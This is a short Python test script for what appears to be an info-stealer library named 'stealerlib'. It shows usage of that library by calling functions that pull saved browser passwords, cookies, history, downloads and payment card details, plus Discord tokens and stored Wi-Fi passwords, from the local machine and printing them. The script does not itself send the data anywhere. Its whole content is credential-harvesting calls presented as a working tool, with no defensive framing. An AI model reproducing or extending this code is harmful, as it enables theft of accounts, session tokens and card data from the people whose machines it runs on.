#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: tests.py
"""

from stealerlib.wifi import WiFi
from stealerlib.discord import Discord
from stealerlib.browser import Browser


if __name__ == '__main__':
    browser = Browser()
    network = WiFi()
    discord = Discord()

    passwords = browser.get_passwords()
    print(passwords, '\n') # -> [(url, username, password), ...]

    cookies = browser.get_cookies()
    print(cookies, '\n') # -> [(host, expires?, expire_date, path, name, value), ...]

    history = browser.get_history()
    print(history, '\n') # -> [(site_url, title, timestamp), ...]

    downloads = browser.get_downloads()
    print(downloads, '\n') # -> [(tab_url, local_path), ...]

    cards = browser.get_cards()
    print(cards, '\n') # -> [((name, month, year, number, date_modified), ...]

    discord.get_tokens()
    print(discord.tokens, '\n') # -> [token1, token2, ...]

    network.get_wifi_passwords()
    print(network.credentials, '\n') # -> [(ssid, password), ...]